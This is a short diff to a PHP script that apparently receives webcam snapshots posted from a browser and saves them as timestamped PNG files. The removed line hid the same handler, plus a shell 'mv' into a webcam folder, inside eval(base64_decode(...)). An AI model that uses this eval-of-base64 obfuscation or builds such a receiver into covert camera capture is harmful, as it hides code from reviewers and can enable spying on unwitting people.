@@ -1,1 +1,19 @@
-<?php eval(base64_decode("Pz48P3BocAoKJGRhdGUgPSBkYXRlKCdkTVlIaXMnKTsKJGltYWdlRGF0YT0kX1BPU1RbJ2NhdCddOwoKaWYgKCFlbXB0eSgkX1BPU1RbJ2NhdCddKSkgewplcnJvcl9sb2coIlJlY2VpdmVkIiAuICJcclxuIiwgMywgIkxvZy5sb2ciKTsKCn0KCiRmaWx0ZXJlZERhdGE9c3Vic3RyKCRpbWFnZURhdGEsIHN0cnBvcygkaW1hZ2VEYXRhLCAiLCIpKzEpOwokdW5lbmNvZGVkRGF0YT1iYXNlNjRfZGVjb2RlKCRmaWx0ZXJlZERhdGEpOwokZnAgPSBmb3BlbiggJ2NhbScuJGRhdGUuJy5wbmcnLCAnd2InICk7CnN5c3RlbSgibXYgY2FtJGRhdGUucG5nIH4vd2ViY2FtL2ZvdG9zIik7CmZ3cml0ZSggJGZwLCAkdW5lbmNvZGVkRGF0YSk7CmZjbG9zZSggJGZwICk7CgpleGl0KCk7Cj8+Cgo=")); ?>
+<?php
+
+$date = date('dMYHis');
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$unencodedData=base64_decode($filteredData);
+$fp = fopen( 'cam'.$date.'.png', 'wb' );
+fwrite( $fp, $unencodedData);
+fclose( $fp );
+
+exit();
+?>
+
